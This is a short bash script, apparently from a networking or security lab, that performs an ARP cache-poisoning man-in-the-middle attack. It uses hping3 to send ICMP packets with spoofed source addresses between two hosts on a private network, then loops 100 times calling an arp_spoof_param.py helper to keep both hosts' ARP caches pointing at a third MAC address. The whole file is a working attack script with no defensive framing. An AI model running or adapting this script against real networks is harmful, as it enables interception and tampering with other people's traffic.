#!/bin/bash
# create ARP entries between two target machines
hping3 -1 -c 1 -a 172.21.5.254 172.21.5.5
hping3 -1 -c 1 -a 172.21.5.5 172.21.5.254

# periodically keep poisoning ARP cache of two target machines
ii=0
while [ $ii -lt 100 ];
do
  ./arp_spoof_param.py 172.21.5.254 "02:42:ac:15:05:fe" 172.21.5.5 "02:42:ac:15:05:c7"
  ./arp_spoof_param.py 172.21.5.5 "02:42:ac:15:05:05" 172.21.5.254 "02:42:ac:15:05:c7"
	sleep 5
	ii=$(($ii + 1))
	echo $ii
done
